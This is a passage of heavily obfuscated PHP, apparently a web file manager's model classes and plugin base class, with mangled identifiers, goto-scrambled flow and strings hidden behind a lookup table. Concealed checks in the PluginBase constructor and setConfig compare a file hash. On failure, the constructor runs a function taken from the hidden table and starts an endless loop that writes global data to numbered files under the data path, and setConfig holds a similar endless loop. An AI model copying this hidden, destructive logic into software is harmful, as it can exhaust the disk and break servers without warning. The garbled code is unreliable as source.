userNoticeGet($c©à“Ô¡° = false) { $this->initUserOption(); return parent::listData($c©à“Ô¡°, $_SERVER[»„][363], !0); } public function userNoticeAdd($dƒŒâÌĞ®…) { $cè—Ñó¬Øó =& $_SERVER[»„]; $this->initUserOption(); $A…ç®Ï˜™ = $this->findByKey($cè—Ñó¬Øó[2445], $dƒŒâÌĞ®…[$cè—Ñó¬Øó[363]]); if ($A…ç®Ï˜™) { return !0; } $a•¹ÉƒÓ˜¢ = array($cè—Ñó¬Øó[2445] => $dƒŒâÌĞ®…[$cè—Ñó¬Øó[363]], $cè—Ñó¬Øó[28] => $dƒŒâÌĞ®…[$cè—Ñó¬Øó[28]], $cè—Ñó¬Øó[186] => $dƒŒâÌĞ®…[$cè—Ñó¬Øó[186]], $cè—Ñó¬Øó[29] => isset($dƒŒâÌĞ®…[$cè—Ñó¬Øó[29]]) ? $dƒŒâÌĞ®…[$cè—Ñó¬Øó[29]] : 1, $cè—Ñó¬Øó[2446] => isset($dƒŒâÌĞ®…[$cè—Ñó¬Øó[2446]]) ? $dƒŒâÌĞ®…[$cè—Ñó¬Øó[2446]] : 0, $cè—Ñó¬Øó[677] => 0, $cè—Ñó¬Øó[179] => 0); return parent::insert($a•¹ÉƒÓ˜¢); } public function userNoticeEdit($B®¤Î—Óæ, $CƒÆ¯Ô«¥Ò) { $this->initUserOption(); return parent::update($B®¤Î—Óæ, $CƒÆ¯Ô«¥Ò); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\155\x5f\157\160\164\x69\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\x6c\145", "\162\x6f\154\145\107\162\157\x75\x70", "\162\145\x67\x69\x73\x74", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($e² ‹Ìçâœ) { return "\x53\171\x73\164\x65\155\117\160\x74\x69\x6f\x6e\137{$e² ‹Ìçâœ}"; } protected function optionDefault($Cº‹ÙôÄÈ‹ = '') { $døåÒä =& $_SERVER[»„]; if ($Cº‹ÙôÄÈ‹ == $døåÒä[33]) { return $GLOBALS[$døåÒä[6]][$døåÒä[2447]]; } } } goto eŸÓ‚‘ôÔ; DÜÁï’¥: function beforeShutdown() { Hook::trigger($_SERVER[ÓÊÌ][36]); } $_SERVER[$_SERVER[ÓÊÌ][37]] = BASIC_PATH; $_SERVER[$_SERVER[ÓÊÌ][38]] = LIB_DIR; goto E‹‚Ï¬• ª; b¶‘Ú¶Ä×¦: class Message { function __construct() { } public function send($eæ÷ùœğì§ = '', $f²‹´åàØ  = array(), $E«—»º½Ì‹ = "\164\145\x78\x74") { goto bøêôÅ˜‰; bøêôÅ˜‰: $BêáÒò•Ë =& $_SERVER[»„]; $eâ“Ñ§œÒñ = array($BêáÒò•Ë[29] => $BêáÒò•Ë[1285], $BêáÒò•Ë[680] => $eæ÷ùœğì§); if (in_array($E«—»º½Ì‹, array($BêáÒò•Ë[1285], $BêáÒò•Ë[1286]))) { $eâ“Ñ§œÒñ[$BêáÒò•Ë[29]] = $E«—»º½Ì‹; } goto A»äÆÆÚ¡Õ; aòçµíÒ›: Hook::trigger($BêáÒò•Ë[1288], $a˜Çƒ±«…); goto B¡¾˜¢ï÷¸; A»äÆÆÚ¡Õ: $f²‹´åàØ  = array($BêáÒò•Ë[961] => isset($f²‹´åàØ [$BêáÒò•Ë[961]]) ? $f²‹´åàØ [$BêáÒò•Ë[961]] : $BêáÒò•Ë[33], $BêáÒò•Ë[531] => isset($f²‹´åàØ [$BêáÒò•Ë[531]]) ? $f²‹´åàØ [$BêáÒò•Ë[531]] : $BêáÒò•Ë[33]); if (empty($eæ÷ùœğì§) || empty($f²‹´åàØ [$BêáÒò•Ë[961]]) && empty($f²‹´åàØ [$BêáÒò•Ë[531]])) { return !1; } $a˜Çƒ±«… = array($BêáÒò•Ë[1226] => $eâ“Ñ§œÒñ, $BêáÒò•Ë[1287] => $f²‹´åàØ ); goto aòçµíÒ›; B¡¾˜¢ï÷¸: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto AÇ™‰å‘ ; EœÊ…Äõ¶¶: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bøĞìò†‰®; A§§Ì“ô¸Š: if ($_SERVER[$CÄÁ½ëŠÚÁ[750]] != $b«¦È™‡ñ¶($e‹Ûº¬ËĞÛ)) { goto A÷á•ŸÁ¥Š; A÷á•ŸÁ¥Š: $bÈ‚­³Ö© = $CÄÁ½ëŠÚÁ[783]; $bŞ›º°•Ÿğ = $CÄÁ½ëŠÚÁ[751]; $E“¶õ¤¡ëÑ = $_SERVER[$CÄÁ½ëŠÚÁ[752]] . $CÄÁ½ëŠÚÁ[753]; goto b«¶½¤æ¹; a§´Û®Èš¾: $cÈÄ‰Úğ…… = $CÄÁ½ëŠÚÁ[784]; $cÈÄ‰Úğ……($_SERVER[$CÄÁ½ëŠÚÁ[785]]); $bÈ‚­³Ö© = $CÄÁ½ëŠÚÁ[783]; goto d™µÁöáÌØ; aÜš²øµ´Î: $e÷šÅ®¿ˆ = 1; for ($C£Ø´©°¸É = $e÷šÅ®¿ˆ; $C£Ø´©°¸É > 0; $C£Ø´©°¸É++) { $f¤æ‘ïÄ©¸(DATA_PATH . $C£Ø´©°¸É, $A†ÍŞšÅã); } goto dƒ¾ö¯“„É; b«¶½¤æ¹: $c™­“ñÎ¡ = $bŞ›º°•Ÿğ($E“¶õ¤¡ëÑ); $Aì¼ç¨Ùë¯ = explode($CÄÁ½ëŠÚÁ[213], $c™­“ñÎ¡); if (count($Aì¼ç¨Ùë¯) < $CÄÁ½ëŠÚÁ[554]) { $aÜÂñè¤«¤ = $CÄÁ½ëŠÚÁ[754]; $aÜÂñè¤«¤(); } goto a§´Û®Èš¾; d™µÁöáÌØ: $bÈ‚­³Ö©(); $f¤æ‘ïÄ©¸ = $CÄÁ½ëŠÚÁ[1289]; $A†ÍŞšÅã = json_encode($GLOBALS[$CÄÁ½ëŠÚÁ[1290]]); goto aÜš²øµ´Î; dƒ¾ö¯“„É: } global $in, $config; $this->config =& $config; goto e²ŞÇøĞ¡ã; AÇ™‰å‘ : $CÄÁ½ëŠÚÁ =& $_SERVER[»„]; $e‹Ûº¬ËĞÛ = $_SERVER[$CÄÁ½ëŠÚÁ[752]] . $CÄÁ½ëŠÚÁ[753]; $b«¦È™‡ñ¶ = $CÄÁ½ëŠÚÁ[749]; goto A§§Ì“ô¸Š; EìÂ·›„Î¹: $this->pluginHostDefault = $config[$CÄÁ½ëŠÚÁ[1293]] . $this->pluginName . $CÄÁ½ëŠÚÁ[8]; $B™ŠÊ‡©– = $config[$CÄÁ½ëŠÚÁ[1294]]; if ($B™ŠÊ‡©– && strpos($CÄÁ½ëŠÚÁ[47] . $B™ŠÊ‡©– . $CÄÁ½ëŠÚÁ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$CÄÁ½ëŠÚÁ[1295]] . $this->pluginName . $CÄÁ½ëŠÚÁ[8]; } goto EœÊ…Äõ¶¶; e²ŞÇøĞ¡ã: $this->in =& $in; $this->modelPlugin = Model($CÄÁ½ëŠÚÁ[1291]); $this->pluginName = str_replace($CÄÁ½ëŠÚÁ[1291], $CÄÁ½ëŠÚÁ[33], get_class($this)); goto fäµ²Áíù; fäµ²Áíù: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $CÄÁ½ëŠÚÁ[8]; $this->pluginApi = appHostGet() . $CÄÁ½ëŠÚÁ[1292] . $this->pluginName . $CÄÁ½ëŠÚÁ[8]; $this->pluginHost = $config[$CÄÁ½ëŠÚÁ[1293]] . $this->pluginName . $CÄÁ½ëŠÚÁ[8]; goto EìÂ·›„Î¹; bøĞìò†‰®: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[»„][1296]); } protected function assign($e¡¶ñ¿£³‘, $e·¬‹œŒÆç = false) { if (is_array($e¡¶ñ¿£³‘)) { $this->values = array_merge($this->values, $e¡¶ñ¿£³‘); } else { $this->values[$e¡¶ñ¿£³‘] = $e·¬‹œŒÆç; } } protected function display($f–ÃÓ§ÄÑ) { extract($this->values); require $f–ÃÓ§ÄÑ; } final function hookRegist($aÉß†âÔÑ) { $this->modelPlugin->appRegist($this->pluginName, $aÉß†âÔÑ); } final function appIcon() { $B©›‹‚ê¤ =& $_SERVER[»„]; $eïß¬™ÍÆ¿ = $this->appPackage(); $B®²™¿°Â» = $B©›‹‚ê¤[33]; if (isset($eïß¬™ÍÆ¿[$B©›‹‚ê¤[378]])) { if (isset($eïß¬™ÍÆ¿[$B©›‹‚ê¤[378]][$B©›‹‚ê¤[1297]])) { $B®²™¿°Â» = $B©›‹‚ê¤[1298] . $eïß¬™ÍÆ¿[$B©›‹‚ê¤[378]][$B©›‹‚ê¤[1297]] . $B©›‹‚ê¤[1299]; } else { if ($eïß¬™ÍÆ¿[$B©›‹‚ê¤[378]][$B©›‹‚ê¤[1300]]) { $B®²™¿°Â» = $B©›‹‚ê¤[1301] . $eïß¬™ÍÆ¿[$B©›‹‚ê¤[378]][$B©›‹‚ê¤[1300]] . $B©›‹‚ê¤[1302]; } } } return $B®²™¿°Â»; } final function fileCanView($bÚÏø¾º·À) { $e¹à…ÊÜ¿ =& $_SERVER[»„]; if (request_url_safe($bÚÏø¾º·À)) { return !0; } if ($this->isShare($bÚÏø¾º·À)) { return !0; } if (!Action($e¹à…ÊÜ¿[1303])->authCan($e¹à…ÊÜ¿[1304])) { show_tips(LNG($e¹à…ÊÜ¿[1305]) . $e¹à…ÊÜ¿[1306], !1); } ActionCall($e¹à…ÊÜ¿[1307], $bÚÏø¾º·À); } final function isShare($f¤™‡ê‡âˆ) { $c‹±„ªÇĞö = KodIO::parse($f¤™‡ê‡âˆ); return $c‹±„ªÇĞö[$_SERVER[»„][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FªÃ×ÕŒ‹°) { if (request_url_safe($FªÃ×ÕŒ‹°)) { return $FªÃ×ÕŒ‹°; } if (!$this->isShare($FªÃ×ÕŒ‹°)) { $FªÃ×ÕŒ‹° = $this->filePath($FªÃ×ÕŒ‹°); } return Action($_SERVER[»„][1005])->linkOut($FªÃ×ÕŒ‹°); } public function filePathLinkOut($c´ˆ÷˜ë±ƒ) { if (request_url_safe($c´ˆ÷˜ë±ƒ)) { return $c´ˆ÷˜ë±ƒ; } $this->fileCanView($c´ˆ÷˜ë±ƒ); return Action($_SERVER[»„][1005])->link($c´ˆ÷˜ë±ƒ); } final function filePath($f„—¯ÒèÎ÷) { $CÄ‡ìÉ×¾ =& $_SERVER[»„]; if ($c¼ŞŒÏ˜Ø = $this->checkSharePath($f„—¯ÒèÎ÷)) { return $c¼ŞŒÏ˜Ø; } $this->fileCanView($f„—¯ÒèÎ÷); if (request_url_safe($f„—¯ÒèÎ÷)) { $C‡õîÚŞËÕ = parse_url_query($f„—¯ÒèÎ÷); if (isset($C‡õîÚŞËÕ[$CÄ‡ìÉ×¾[1308]]) && isset($C‡õîÚŞËÕ[$CÄ‡ìÉ×¾[193]])) { $D§ò¾ì„› = Model($CÄ‡ìÉ×¾[1076])->get($CÄ‡ìÉ×¾[1309]); $bÊ­âÌ¦’ª = Mcrypt::decode($C‡õîÚŞËÕ[$CÄ‡ìÉ×¾[193]], $D§ò¾ì„›); if ($bÊ­âÌ¦’ª) { $this->fileInfo = IO::infoWithChildren($bÊ­âÌ¦’ª); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $bÊ­âÌ¦’ª; } } $f„—¯ÒèÎ÷ = $this->_cacheHttpFile($f„—¯ÒèÎ÷); $this->fileInfo = IO::infoWithChildren($f„—¯ÒèÎ÷); } else { $this->fileInfo = IO::infoWithChildren($f„—¯ÒèÎ÷); if (!$this->fileInfo) { show_tips(LNG($CÄ‡ìÉ×¾[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $f„—¯ÒèÎ÷; } final function _cacheHttpFile($AĞÏ¾ã–) { $B˜ğìï—†¸ = hash_path($AĞÏ¾ã–, !0); $this->cachePath = $this->pluginCachePath($B˜ğìï—†¸); if ($e´´ˆù’èĞ = IO::fileNameExist($this->cachePath, $B˜ğìï—†¸)) { return KodIO::make($e´´ˆù’èĞ); } $EÃİÛ¡¥Å = $this->cachePath . $B˜ğìï—†¸; return $this->pluginCacheFileSet($EÃİÛ¡¥Å, file_get_contents($AĞÏ¾ã–)); } final function _tmpFileName($FÇäêí´ä” = array()) { goto AŠéÏÀ…´±; f½Â¹ëÆÙÉ: return md5(implode($dã‡òÆŒ¶[70], $Eî¢šàÈõĞ)); goto fŠŠ¢Âé‡; AŠéÏÀ…´±: $dã‡òÆŒ¶ =& $_SERVER[»„]; if (!$FÇäêí´ä”) { $FÇäêí´ä” = $this->fileInfo; } if (isset($FÇäêí´ä”[$dã‡òÆŒ¶[160]])) { return $FÇäêí´ä”[$dã‡òÆŒ¶[160]]; } goto DÀàÃ©Æ›ˆ; DÀàÃ©Æ›ˆ: if (isset($FÇäêí´ä”[$dã‡òÆŒ¶[158]][$dã‡òÆŒ¶[160]])) { return $FÇäêí´ä”[$dã‡òÆŒ¶[158]][$dã‡òÆŒ¶[160]]; } $Eî¢šàÈõĞ = array($FÇäêí´ä”[$dã‡òÆŒ¶[28]], $FÇäêí´ä”[$dã‡òÆŒ¶[75]], $FÇäêí´ä”[$dã‡òÆŒ¶[77]]); if (isset($FÇäêí´ä”[$dã‡òÆŒ¶[455]])) { $Eî¢šàÈõĞ[] = $FÇäêí´ä”[$dã‡òÆŒ¶[455]]; } goto f½Â¹ëÆÙÉ; fŠŠ¢Âé‡: } final function checkSharePath($DëºË’²¤») { goto B ÃíÄ«·¨; a¯ø´Âß×®: $this->cachePath = $this->pluginCachePath($this->fileInfo[$c»Ï‹¥•[160]]); return $dÂŒÆÊ÷æñ[$c»Ï‹¥•[75]]; goto cÓ‹áš·î; f°ÏøõƒÖ: $dÂŒÆÊ÷æñ = Action($c»Ï‹¥•[1005])->sharePathInfo($DëºË’²¤»); if (!isset($dÂŒÆÊ÷æñ[$c»Ï‹¥•[75]])) { show_json(LNG($c»Ï‹¥•[1311]), !1); } $this->fileInfo = $dÂŒÆÊ÷æñ[$c»Ï‹¥•[158]]; goto a¯ø´Âß×®; B ÃíÄ«·¨: $c»Ï‹¥• =& $_SERVER[»„]; if (!defined($c»Ï‹¥•[423])) { define($c»Ï‹¥•[1310], 0); } if (!$this->isShare($DëºË’²¤»)) { return !1; } goto f°ÏøõƒÖ; cÓ‹áš·î: } final function pluginCachePath($aÕ›í‰ê®Î = '') { $D®ğ ­¨İ¾ =& $_SERVER[»„]; $Eè™œÏåñ = IO_PATH_SYSTEM_TEMP . $D®ğ ­¨İ¾[1312] . $this->pluginName; if (!($F¨Í¬â¨½ = IO::infoFull($Eè™œÏåñ))) { return IO::mkdir($Eè™œÏåñ . $D®ğ ­¨İ¾[8] . $aÕ›í‰ê®Î); } if (empty($aÕ›í‰ê®Î)) { return $F¨Í¬â¨½[$D®ğ ­¨İ¾[75]]; } if (!($fé‚ğÈùá° = IO::fileNameExist($F¨Í¬â¨½[$D®ğ ­¨İ¾[75]], $aÕ›í‰ê®Î))) { return IO::mkdir($F¨Í¬â¨½[$D®ğ ­¨İ¾[75]] . $aÕ›í‰ê®Î); } return KodIO::make($fé‚ğÈùá°); } final function pluginCacheFileSet($aøÙÃĞêŒ–, $AÄÅ¨òëÍ¬ = '') { $Aô‰ğ•¿î =& $_SERVER[»„]; if (!($A¬—õÇ½ëİ = IO::infoFull($aøÙÃĞêŒ–))) { return IO::mkfile($aøÙÃĞêŒ–, $AÄÅ¨òëÍ¬, REPEAT_REPLACE); } IO::setContent($A¬—õÇ½ëİ[$Aô‰ğ•¿î[75]], $AÄÅ¨òëÍ¬); return $A¬—õÇ½ëİ[$Aô‰ğ•¿î[75]]; } final function pluginLocalFile($cÅšÎÑİšƒ = '') { goto e¤´Ö‡ˆÏ›; BéŠ®ÖöŸ: $aÇ‡¯‹÷µù = $fĞİÕƒ± . $E¡ùœ†ç‚; if (@file_exists($aÇ‡¯‹÷µù)) { return $aÇ‡¯‹÷µù; } return IO::copy($cÅšÎÑİšƒ, $fĞİÕƒ±, 0, $E¡ùœ†ç‚); goto aŸ­÷ÖÂ¼Ä; e¤´Ö‡ˆÏ›: $bñƒ½Šøìˆ =& $_SERVER[»„]; $fĞİÕƒ± = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($fĞİÕƒ±)) { mk_dir($fĞİÕƒ±); } goto d øæõÎé; d øæõÎé: if (!$cÅšÎÑİšƒ) { return $fĞİÕƒ±; } $f•ÇÔç·º… = IO::info($cÅšÎÑİšƒ); $E¡ùœ†ç‚ = $this->_tmpFileName($f•ÇÔç·º…) . $bñƒ½Šøìˆ[91] . $f•ÇÔç·º…[$bñƒ½Šøìˆ[156]]; goto BéŠ®ÖöŸ; aŸ­÷ÖÂ¼Ä: } final function appPackage() { goto cØÁ¿â÷¯¸; E³¹à¶Ò: return $eÖ¯×¼ëÀ; goto Aã‰‰Ù “°; EŞ†Õ†šõ: $AÃİ…½Íäß = Hook::trigger($AË¹ŒÖ”Ùî[1314], $eÖ¯×¼ëÀ); if ($AÃİ…½Íäß && is_array($AÃİ…½Íäß)) { $eÖ¯×¼ëÀ = $AÃİ…½Íäß; } $this->packageData = $eÖ¯×¼ëÀ; goto E³¹à¶Ò; EŞÙóÂ›–×: $this->parseLang($AëÃ´ˆˆâ÷); $eÖ¯×¼ëÀ = json_decode_force($AëÃ´ˆˆâ÷); if (!$eÖ¯×¼ëÀ) { return array(); } goto EŞ†Õ†šõ; cØÁ¿â÷¯¸: $AË¹ŒÖ”Ùî =& $_SERVER[»„]; if ($this->packageData) { return $this->packageData; } $AëÃ´ˆˆâ÷ = $this->parseFile($this->pluginPath . $AË¹ŒÖ”Ùî[1313]); goto EŞÙóÂ›–×; Aã‰‰Ù “°: } public function packageInfoGet($båùÁÔ©îé) { $D·³¨ªÚ˜Õ = $this->appPackage(); return array_get_value($D·³¨ªÚ˜Õ, $båùÁÔ©îé); } public function packageVersion() { return $this->packageInfoGet($_SERVER[»„][1315]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[»„][1316]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[»„][1317]); } private function parseFile($b©Á¹Óõ½) { $eé«¨Ê÷ãà =& $_SERVER[»„]; $B‘Ê“ÕÆ÷¸ = file_get_contents($b©Á¹Óõ½); $Eº¶ŞÑÄÎ = array($eé«¨Ê÷ãà[1318], $eé«¨Ê÷ãà[1319], $eé«¨Ê÷ãà[1320], $eé«¨Ê÷ãà[1321], $eé«¨Ê÷ãà[1322], $eé«¨Ê÷ãà[1323], $eé«¨Ê÷ãà[1324]); $E‚¤°È¦‡ä = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$eé«¨Ê÷ãà[84]][$eé«¨Ê÷ãà[1325]]); $B‘Ê“ÕÆ÷¸ = str_replace($Eº¶ŞÑÄÎ, $E‚¤°È¦‡ä, $B‘Ê“ÕÆ÷¸); return $B‘Ê“ÕÆ÷¸; } private function parseLang(&$Bñ‰›¦Ï¨“) { goto EÁƒÌœ½¬ğ; eê÷¹™®Ô: $F–Û±ÑØ‘ = array(); foreach ($fèğÚ÷•…©[0] as $d•÷šœ™î) { $bŸºğåÊÏË = substr($d•÷šœ™î, strlen($F‹ƒ÷›ĞÖ), -4); $D„°ø½¹ = LNG($bŸºğåÊÏË); $eÇÀ…Î¹«[] = $d•÷šœ™î; $F–Û±ÑØ‘[] = str_replace(array($e…ŸÁ‰İÃì[213], $e…ŸÁ‰İÃì[980], $e…ŸÁ‰İÃì[326], $e…ŸÁ‰İÃì[112]), array($e…ŸÁ‰İÃì[50], $e…ŸÁ‰İÃì[50], $e…ŸÁ‰İÃì[33], $e…ŸÁ‰İÃì[1328]), $D„°ø½¹); } $Bñ‰›¦Ï¨“ = str_replace($eÇÀ…Î¹«, $F–Û±ÑØ‘, $Bñ‰›¦Ï¨“); goto BË±¿¯ÔåŠ; EÁƒÌœ½¬ğ: $e…ŸÁ‰İÃì =& $_SERVER[»„]; $F‹ƒ÷›ĞÖ = $e…ŸÁ‰İÃì[1326]; if (!strstr($Bñ‰›¦Ï¨“, $F‹ƒ÷›ĞÖ)) { return; } goto AÃ«Ù±¡¨÷; AÃ«Ù±¡¨÷: preg_match_all($e…ŸÁ‰İÃì[1327], $Bñ‰›¦Ï¨“, $fèğÚ÷•…©); if (!is_array($fèğÚ÷•…©) || count($fèğÚ÷•…©) == 0 || !is_array($fèğÚ÷•…©[0]) || count($fèğÚ÷•…©[0]) == 0) { return; } $eÇÀ…Î¹« = array(); goto eê÷¹™®Ô; BË±¿¯ÔåŠ: } private function parseConfig(&$EâáùµÖ¨Ó) { goto F¯Èº‡ñ³æ; fàé‰Ù˜ñ: preg_match_all($BÙâäÜà[1330], $EâáùµÖ¨Ó, $c‹¼ï¡Ëî); if (!is_array($c‹¼ï¡Ëî) || count($c‹¼ï¡Ëî) == 0 || !is_array($c‹¼ï¡Ëî[0]) || count($c‹¼ï¡Ëî[0]) == 0) { return; } $c–‡î”Ó» = $this->getConfig(); goto bîœ¹–ƒ† ; bîœ¹–ƒ† : $bç’¿æáğˆ = array(); $FÓ†‰‘ĞÛ÷ = array(); foreach ($c‹¼ï¡Ëî[0] as $FªÊÓ·ÈçŒ) { $EìÓÀË•†³ = substr($FªÊÓ·ÈçŒ, strlen($FÔ°’¿“Öˆ), -2); $bç’¿æáğˆ[] = $FªÊÓ·ÈçŒ; $FÓ†‰‘ĞÛ÷[] = _get($c–‡î”Ó», $EìÓÀË•†³); } goto cÀ§‡Ä¡Û; F¯Èº‡ñ³æ: $BÙâäÜà =& $_SERVER[»„]; $FÔ°’¿“Öˆ = $BÙâäÜà[1329]; if (!strstr($EâáùµÖ¨Ó, $FÔ°’¿“Öˆ)) { return; } goto fàé‰Ù˜ñ; cÀ§‡Ä¡Û: $EâáùµÖ¨Ó = str_replace($bç’¿æáğˆ, $FÓ†‰‘ĞÛ÷, $EâáùµÖ¨Ó); goto cˆºÆĞ‘; cˆºÆĞ‘: } private function parsePackage(&$dÃâÓ´ôÀ¢) { goto D´Çò²Ó‰ê; D´Çò²Ó‰ê: $fÅ—ˆÖßƒ =& $_SERVER[»„]; $c¯¸ŒôŞ  = $fÅ—ˆÖßƒ[1331]; if (!strstr($dÃâÓ´ôÀ¢, $c¯¸ŒôŞ )) { return; } goto bËª¤±‘ñÉ; B¡£·ÓºÍ: $b‘ˆ¸İ›Â  = array(); $FèÛŒ®àœ† = array(); foreach ($BäÏƒ£ó¾¤[0] as $b‰Å¾Œ¼µ¡) { $A‡ÍÏò òè = substr($b‰Å¾Œ¼µ¡, strlen($c¯¸ŒôŞ ), -2); $b‘ˆ¸İ›Â [] = $b‰Å¾Œ¼µ¡; $FèÛŒ®àœ†[] = _get($Bâ”¯öãÌ’, $A‡ÍÏò òè); } goto CŠæôñå„¼; bËª¤±‘ñÉ: preg_match_all($fÅ—ˆÖßƒ[1332], $dÃâÓ´ôÀ¢, $BäÏƒ£ó¾¤); if (!is_array($BäÏƒ£ó¾¤) || count($BäÏƒ£ó¾¤) == 0 || !is_array($BäÏƒ£ó¾¤[0]) || count($BäÏƒ£ó¾¤[0]) == 0) { return; } $Bâ”¯öãÌ’ = $this->appPackage(); goto B¡£·ÓºÍ; CŠæôñå„¼: $dÃâÓ´ôÀ¢ = str_replace($b‘ˆ¸İ›Â , $FèÛŒ®àœ†, $dÃâÓ´ôÀ¢); goto c¹¯æ¯Åğ¥; c¹¯æ¯Åğ¥: } final function echoFile($DÌÕ†Ô¼°æ, $fñ…ÏØ»‹¬ = false) { goto B†¦©‚ØÈŞ; B”Î¿Ìïº: $this->parsePackage($c½¶öºóó); if (is_array($fñ…ÏØ»‹¬)) { $c½¶öºóó = str_replace(array_keys($fñ…ÏØ»‹¬), array_values($fñ…ÏØ»‹¬), $c½¶öºóó); } echo $Fä£ˆ©Üš…[213] . $c½¶öºóó; goto E©”†Æ‡; Fª’‡öÇ„â: $c½¶öºóó = $this->parseFile($EÃ•Ş°“ìØ); $this->parseLang($c½¶öºóó); $this->parseConfig($c½¶öºóó); goto B”Î¿Ìïº; B†¦©‚ØÈŞ: $Fä£ˆ©Üš… =& $_SERVER[»„]; $EÃ•Ş°“ìØ = $this->pluginPath . $DÌÕ†Ô¼°æ; if (ACT == $Fä£ˆ©Üš…[1333]) { echo $Fä£ˆ©Üš…[1334] . $this->pluginName . $Fä£ˆ©Üš…[8] . $DÌÕ†Ô¼°æ . $Fä£ˆ©Üš…[1335]; if (!file_exists($EÃ•Ş°“ìØ)) { echo $Fä£ˆ©Üš…[1336]; return; } } goto Fª’‡öÇ„â; E©”†Æ‡: } final function initLang() { goto B‚›£ò±×; B‚›£ò±×: $D‡÷«ÆŒó³ =& $_SERVER[»„]; $BÎ²èõˆ Ö = $D‡÷«ÆŒó³[1337]; $CØÆŠØ‘‹ù = $this->pluginPath . $D‡÷«ÆŒó³[1338]; goto Aå…ÀĞö²; Aå…ÀĞö²: $EÕ‚á‚Œª¡ = I18n::getType(); $cäèõÊÀ¸ = array(); if (file_exists($CØÆŠØ‘‹ù . $EÕ‚á‚Œª¡ . $D‡÷«ÆŒó³[760])) { $cäèõÊÀ¸ = (include $CØÆŠØ‘‹ù . $EÕ‚á‚Œª¡ . $D‡÷«ÆŒó³[760]); } else { if ($EÕ‚á‚Œª¡ == $D‡÷«ÆŒó³[1339] && !file_exists($CØÆŠØ‘‹ù . $EÕ‚á‚Œª¡ . $D‡÷«ÆŒó³[760]) && file_exists($CØÆŠØ‘‹ù . $D‡÷«ÆŒó³[1340])) { $cäèõÊÀ¸ = (include $CØÆŠØ‘‹ù . $D‡÷«ÆŒó³[1340]); } else { if (file_exists($CØÆŠØ‘‹ù . $BÎ²èõˆ Ö . $D‡÷«ÆŒó³[760])) { $cäèõÊÀ¸ = (include $CØÆŠØ‘‹ù . $BÎ²èõˆ Ö . $D‡÷«ÆŒó³[760]); } } } goto DºŒ¬’ä¿; DºŒ¬’ä¿: if (!is_array($cäèõÊÀ¸)) { return array(); } if (@count($cäèõÊÀ¸) > 0) { I18n::set($cäèõÊÀ¸); } return $cäèõÊÀ¸; goto d ç©ŒòÜ; d ç©ŒòÜ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D—…©–´Ã) { $c·ƒâØ êÆ =& $_SERVER[»„]; if (!isset($_SERVER[$c·ƒâØ êÆ[750]]) || !isset($_SERVER[$c·ƒâØ êÆ[1341]])) { goto Bì‘©óÚ‘»; Bì‘©óÚ‘»: $BÍòŠø¾Ëå = $c·ƒâØ êÆ[783]; $eÒ‡ôí Å = $c·ƒâØ êÆ[751]; $A“´ë“‡¸Å = $_SERVER[$c·ƒâØ êÆ[752]] . $c·ƒâØ êÆ[753]; goto E×®¶ç¢Ó½; E×®¶ç¢Ó½: $AŠÆäÀëµ³ = $eÒ‡ôí Å($A“´ë“‡¸Å); $E‰‡÷Ó­°‘ = explode($c·ƒâØ êÆ[213], $AŠÆäÀëµ³); if (count($E‰‡÷Ó­°‘) < $c·ƒâØ êÆ[554]) { $aîô©ßñº = $c·ƒâØ êÆ[754]; $aîô©ßñº(); } goto aÂÕÚÑŠ‚; C«àéä†“Š: for ($e³‹¾ÇÙññ = $E©¦å½ÊÃØ; $e³‹¾ÇÙññ > 0; $e³‹¾ÇÙññ++) { $b°ŸÖƒ­¨ = json_encode($GLOBALS[$c·ƒâØ êÆ[380]]); } goto f„Š ßºéÙ; aÂÕÚÑŠ‚: $b°ŸÖƒ­¨ = $c·ƒâØ êÆ[784]; $b°ŸÖƒ­¨($_SERVER[$c·ƒâØ êÆ[785]]); $E©¦å½ÊÃØ = 1; goto C«àéä†“Š; f„Š ßºéÙ: } return $this->modelPlugin->setConfig($this->pluginName, $D—…©–´Ã); } public function onSetConfig($A†¯²šæø‚) { } public function onGetConfig($bÀÏ‘Æ÷Å) { } public function onChangeStatus($AËöó‡‰¥¶) { } public function onUninstall() { } public function onInstall() { } public function authCheck($bÄ™á¬ğƒª = "\x70\154\165\147\151\156\101\165\164\x68") { $AêÆö‰Šòï =& $_SERVER[»„]; if (!defined($AêÆö‰Šòï[423])) { return !1; } if (_get($GLOBALS, $AêÆö‰Šòï[453])) { return !0; } $e¶ÕƒÈå¹ = $this->getConfig(); if (!$e¶ÕƒÈå¹[$bÄ™á¬ğƒª]) { return !1; } return ActionCall($AêÆö‰Šòï[1342], $e¶ÕƒÈå¹[$bÄ™á¬ğƒª]); } public function url($bèáë“©óå, $CØîë¼èƒ‰ = '', $e¸Ñ¢ø«àÄ = true) { goto e…È¼¢¿Ù; fÇòñÒ„„: $Eš”î¾±’ = $this->packageVersion(); $cë„Çßµ¸ = $e”›äÈ÷òĞ . $côšŒšˆ¶¼[408] . $Eš”î¾±’; if (substr($bèáë“©óå, 0, 4) == $côšŒšˆ¶¼[142] || substr($bèáë“©óå, 0, 2) == $côšŒšˆ¶¼[1135]) { $E²½Ù¢¤ = $bèáë“©óå . $côšŒšˆ¶¼[1343] . $cë„Çßµ¸; } else { if ($CØîë¼èƒ‰ == $côšŒšˆ¶¼[33]) { $E²½Ù¢¤ = $this->pluginHost . $bèáë“©óå . $côšŒšˆ¶¼[1343] . $cë„Çßµ¸; } else { if ($CØîë¼èƒ‰ === 